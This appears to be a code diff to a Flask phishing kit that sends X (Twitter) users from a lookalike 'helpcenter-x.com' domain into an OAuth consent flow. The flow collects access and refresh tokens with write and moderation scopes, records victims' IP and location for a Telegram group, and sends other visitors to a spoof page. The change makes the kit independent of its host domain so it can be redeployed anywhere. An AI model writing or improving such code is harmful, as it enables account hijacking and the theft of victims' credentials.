@@ -3,6 +3,7 @@ import base64
 import secrets
 import requests
 from datetime import datetime
+from urllib.parse import quote
 from pymongo import MongoClient
 from pymongo.server_api import ServerApi
 from flask import Flask, request, redirect, session
@@ -26,7 +27,7 @@ def link():
     data = groups.find_one()
     identifier = data["identifier"][0]
    
-    return redirect(f"https://helpcenter-x.com/oauth?r={identifier}")
+    return redirect(f"{request.host_url}oauth?r={identifier}")
 
 @app.route('/oauth')
 def oauth():
@@ -66,15 +67,15 @@ def oauth():
         message = f'🌐 *Connection:* {real_ip}\n\n{country_flag} *{city}, {country}*'
         # send_telegram_message(group['group_id'], message)
 
-        twitter_oauth_url = generate_twitter_oauth_url()
+        twitter_oauth_url = generate_twitter_oauth_url(request.host_url)
         return redirect(twitter_oauth_url)
     else:
         return redirect(spoof)
 
 
-def generate_twitter_oauth_url():
+def generate_twitter_oauth_url(host_url):
     TWITTER_CLIENT_ID = session.get("client_id")
-    TWITTER_CALLBACK_URL = 'https%3A%2F%2Fhelpcenter-x.com%2Fauth'
+    TWITTER_CALLBACK_URL = quote(f'{host_url}auth', safe='')
     return (f'https://x.com/i/oauth2/authorize?response_type=code&client_id={TWITTER_CLIENT_ID}'
             f'&redirect_uri={TWITTER_CALLBACK_URL}'
             f'&scope=tweet.read+users.read+tweet.write+offline.access+tweet.moderate.write'
@@ -86,8 +87,8 @@ def auth_callback():
     authorization_code = request.args.get('code')
     if not authorization_code:
         return redirect("https://x.com/")
-        
-    access_token, refresh_token = exchange_token_for_access(authorization_code)
+
+    access_token, refresh_token = exchange_token_for_access(authorization_code, request.url)
     
     user_data = get_twitter_user_data(access_token)
     print(user_data)
@@ -145,7 +146,7 @@ def auth_callback():
     return redirect(session.get("redirect_url", "https://x.com/"))
 
 
-def exchange_token_for_access(authorization_code):
+def exchange_token_for_access(authorization_code, redirect_uri):
     TWITTER_CLIENT_ID = session.get("client_id")
     TWITTER_CLIENT_SECRET = session.get("client_secret")
     credentials = base64.b64encode(f"{TWITTER_CLIENT_ID}:{TWITTER_CLIENT_SECRET}".encode()).decode('utf-8')
@@ -154,7 +155,7 @@ def exchange_token_for_access(authorization_code):
     request_data = {
         'grant_type': 'authorization_code',
         'code': authorization_code,
-        'redirect_uri': 'https://helpcenter-x.com/auth',
+        'redirect_uri': redirect_uri,
         'code_verifier': "challenge"
     }
     headers = {
